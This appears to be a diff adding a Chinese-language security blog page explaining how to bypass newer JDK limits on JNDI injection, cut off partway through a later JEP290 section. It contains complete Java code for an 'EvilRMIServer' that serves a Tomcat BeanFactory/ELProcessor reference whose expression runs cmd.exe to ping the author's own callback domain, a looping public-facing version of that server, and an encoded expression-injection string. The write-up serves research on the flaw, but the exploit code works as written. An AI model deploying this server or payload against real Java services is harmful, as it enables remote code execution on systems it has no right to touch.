@@ -1,0 +1,1236 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+(function(){
+ if(''){
+ if (prompt('请输入文章密码') !== ''){
+                 alert('密码错误！');
+                                 history.back();
+                                             
+ }
+         
+ }
+     
+ })();
+</script>
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-mac-osx.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="v1rus blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="绕过高版本jdk限制进行jndi注入利用JDK 6u141, JDK 7u131, JDK 8u121 之前0x01 关于JNDI Naming Reference的限制JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受us">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java&#x2F;绕过高版本的ldap+rmi&#x2F;1">
+<meta property="og:url" content="https://virusday.github.io/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/index.html">
+<meta property="og:site_name" content="v1rus blog">
+<meta property="og:description" content="绕过高版本jdk限制进行jndi注入利用JDK 6u141, JDK 7u131, JDK 8u121 之前0x01 关于JNDI Naming Reference的限制JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受us">
+<meta property="og:image" content="https://virusday.github.io/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824112543578.png">
+<meta property="og:image" content="https://virusday.github.io/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824112842700.png">
+<meta property="og:image" content="https://virusday.github.io/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824112555709.png">
+<meta property="og:image" content="https://virusday.github.io/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824153434951.png">
+<meta property="og:image" content="https://virusday.github.io/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824153137624.png">
+<meta property="og:image" content="https://virusday.github.io/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210825160927544.png">
+<meta property="og:image" content="https://virusday.github.io/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210825162355416.png">
+<meta property="og:image" content="https://virusday.github.io/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210901112329971.png">
+<meta property="article:published_time" content="2021-08-24T03:16:34.809Z">
+<meta property="article:modified_time" content="2021-11-01T01:56:43.360Z">
+<meta property="article:author" content="Virusday">
+<meta property="article:tag" content="Learn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://virusday.github.io/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824112543578.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://virusday.github.io/2021/08/24/java/绕过高版本的ldap+rmi/1/"/>
+
+
+
+
+
+  <title>java/绕过高版本的ldap+rmi/1 | v1rus blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1rus blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">做些有意思的事</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://virusday.github.io/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Virusday">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/user.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1rus blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">java/绕过高版本的ldap+rmi/1</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-08-24T11:16:34+08:00">
+                2021-08-24
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2021-11-01T09:56:43+08:00">
+                2021-11-01
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="绕过高版本jdk限制进行jndi注入利用"><a href="#绕过高版本jdk限制进行jndi注入利用" class="headerlink" title="绕过高版本jdk限制进行jndi注入利用"></a>绕过高版本jdk限制进行jndi注入利用</h1><h2 id="JDK-6u141-JDK-7u131-JDK-8u121-之前"><a href="#JDK-6u141-JDK-7u131-JDK-8u121-之前" class="headerlink" title="JDK 6u141, JDK 7u131, JDK 8u121 之前"></a>JDK 6u141, JDK 7u131, JDK 8u121 之前</h2><h3 id="0x01-关于JNDI-Naming-Reference的限制"><a href="#0x01-关于JNDI-Naming-Reference的限制" class="headerlink" title="0x01 关于JNDI Naming Reference的限制"></a>0x01 关于JNDI Naming Reference的限制</h3><p>JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受useCodebaseOnly影响，因为它没有用到 RMI Class loading，它最终是通过URLClassLoader加载的远程类。</p>
+<p>NamingManager.java（1.8.221）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">    InstantiationException,</span></span><br><span class="line"><span class="function">    MalformedURLException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to use current class loader</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码中会先尝试在本地CLASSPATH中加载类<code>clas = helper.loadClass(factoryName);</code>不行再从Codebase中加载<code>clas = helper.loadClass(factoryName, codebase);</code>Codebase的值是通过ref.getFactoryClassLocation()获得。</p>
+<p>1、我们先进从本地获取的方法，这里的helper是VersionHelper12类，跟进getContextClassLoader方法，最后是通过<code>Thread.currentThread().getContextClassLoader</code>方法返回loader对象<code>Launcher$AppClassLoader</code>这个静态内部类是继承URLClassloader的。</p>
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824112543578.png" alt="image-20210824112543578"></p>
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824112842700.png" alt="image-20210824112842700"></p>
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824112555709.png" alt="image-20210824112555709"></p>
+<p>2、 第二种是远程加载的方式 就是第二行代码</p>
+<p>也就是本地ClassLoader找不到这个类，最后通过 VersionHelper12.loadClass() 中 URLClassLoader 加载了远程class。本地不存在这个类，从codebase中获取。所以java.rmi.server.useCodebaseOnly不会限制JNDI Reference的利用，有影响的是高版本JDK中的这几个系统属性：</p>
+<ul>
+<li>com.sun.jndi.rmi.object.trustURLCodebase</li>
+<li>com.sun.jndi.cosnaming.object.trustURLCodebase</li>
+<li>com.sun.jndi.ldap.object.trustURLCodebase</li>
+</ul>
+<h3 id="0x02-关于codebase"><a href="#0x02-关于codebase" class="headerlink" title="0x02 关于codebase"></a>0x02 关于codebase</h3><p>Oracle官方关于Codebase的说明：<a href="https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html</a></p>
+<p>Codebase指定了Java程序在网络上远程加载类的路径。RMI机制中交互的数据是序列化形式传输的，但是传输的只是对象的数据内容，RMI本身并不会传递类的代码。当本地没有该对象的类定义时，RMI提供了一些方法可以远程加载类，也就是RMI动态加载类的特性。</p>
+<p>当对象发送序列化数据时，会在序列化流中附加上Codebase的信息，这个信息告诉接收方到什么地方寻找该对象的执行代码。Codebase实际上是一个URL表，该URL上存放了接收方需要的类文件。在大多数情况下，你可以在命令行上通过属性 java.rmi.server.codebase 来设置Codebase。</p>
+<p>例如，如果所需的类文件在Webserver的根目录下，那么设置Codebase的命令行参数如下（如果你把类文件打包成了jar，那么设置Codebase时需要指定这个jar文件）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.codebase&#x3D;http:&#x2F;&#x2F;url:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>当接收程序试图从该URL的Webserver上下载类文件时，它会把类的包名转化成目录，在Codebase 的对应目录下查询类文件，如果你传递的是类文件 com.project.test ，那么接受方就会到下面的URL去下载类文件： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url:8080&#x2F;com&#x2F;project&#x2F;test.class</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>我做了如下的测试 观看使用<code>marshalsec-0.0.3-SNAPSHOT-all.jar</code>这个jar包，在<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>这个方法的时候，ref参数的情况，第一张是使用jar包的。</p>
+<p>​    <img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824153434951.png" alt="image-20210824153434951"></p>
+<p>第二张使用如下代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Integer s = (<span class="keyword">int</span>) (Math.random() * <span class="number">1000</span>);</span><br><span class="line">        String ss = Integer.toString(s);</span><br><span class="line">        System.out.println(<span class="string">"[*]Evil RMI Server is Listening on port: 6666"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry( <span class="number">6666</span>);</span><br><span class="line">        <span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">        <span class="comment">// 利用表达式执行命令</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe', '/c', 'ping "</span>+ ss +<span class="string">".sec.v1rus.top']).start()\")"</span>));</span><br><span class="line">        System.out.println(<span class="string">"[*]Evil command: ping v1rus.top"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824153137624.png" alt="image-20210824153137624"></p>
+<p>可以看到，使用<code>marshalsec-0.0.3-SNAPSHOT-all.jar</code>是随便申明了一个ref类并且制定了basecode（classFactoryLocation字段）。</p>
+<p>会在这里执BeanFactory的方法。</p>
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210825160927544.png" alt="image-20210825160927544"></p>
+<p>气炸了 最后发现只能传一个参数进去。invoke传入的数组只有一个参数，还是String类型的。</p>
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210825162355416.png" alt="image-20210825162355416"></p>
+<p>所以断了juel包的构造链，只能传入ELProcess来执行代码。后来我为了将这个服务放在公网，必须知道和实现的方法：在启动服务器的时候，实际上需要运行两个服务器，也可以理解为开启两个端口：</p>
+<ul>
+<li>一个是远程对象本身；也就是数据端口</li>
+<li>一个是允许客户端下载远程对象引用的注册表；也就是服务端口 默认1099</li>
+</ul>
+<p>所以再加上随机数，代码如下，很烂：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RMISocketFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> String ss;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> String <span class="title">newNumber</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Integer s = (<span class="keyword">int</span>) (Math.random() * <span class="number">1000</span>);</span><br><span class="line">        ss = Integer.toString(s);</span><br><span class="line">        <span class="keyword">return</span> ss;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Powered by v1rus"</span>);</span><br><span class="line">        System.out.println(<span class="string">"[*]Evil RMI Server is Listening on port: 6666"</span>);</span><br><span class="line">        RMISocketFactory.setSocketFactory(<span class="keyword">new</span> V1RMISocket());</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(xxxx);</span><br><span class="line">        System.setProperty(<span class="string">"java.rmi.server.hostname"</span>,<span class="string">"121.199.xxx.xxx"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">            ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">// 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码</span></span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">            <span class="comment">// 利用表达式执行命令</span></span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe', '/c', 'ping "</span>+ newNumber() +<span class="string">".sec.v1rus.top']).start()\")"</span>));</span><br><span class="line">            <span class="comment">//System.out.println("[*]Evil command: ping v1rus.top");</span></span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">            registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">            registry.unbind(<span class="string">"Object"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.server.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">V1RMISocket</span> <span class="keyword">extends</span> <span class="title">RMISocketFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Socket <span class="title">createSocket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Socket(host,port);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServerSocket <span class="title">createServerSocket</span><span class="params">(<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (port == <span class="number">0</span>)</span><br><span class="line">            port = xxxxx;<span class="comment">//不指定就随机</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ServerSocket(port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>讲个小插曲：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &quot;\&quot;\&quot;.getClass()一般都是这样去获取类的  但是有个别的方式</span><br><span class="line"></span><br><span class="line">queryString&#x3D;aaa\u0027%2b#&#123;\u0022\u0022[\u0022class\u0022]&#125;%2b\u0027bbb</span><br><span class="line">which decodes to - queryString&#x3D;aaa&#39;+#&#123;&quot;&quot;[&quot;class&quot;]&#125;+&#39;bbb</span><br><span class="line"></span><br><span class="line">主要的就是&quot;&quot;[&quot;class&quot;]。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x03-特地去找了一下jdbc-jep290的绕过"><a href="#0x03-特地去找了一下jdbc-jep290的绕过" class="headerlink" title="0x03 特地去找了一下jdbc jep290的绕过"></a>0x03 特地去找了一下jdbc jep290的绕过</h3><p>废话不多说直接上链</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">readObject:424, ObjectInputStream (java.io)</span><br><span class="line">unmarshalValue:322, 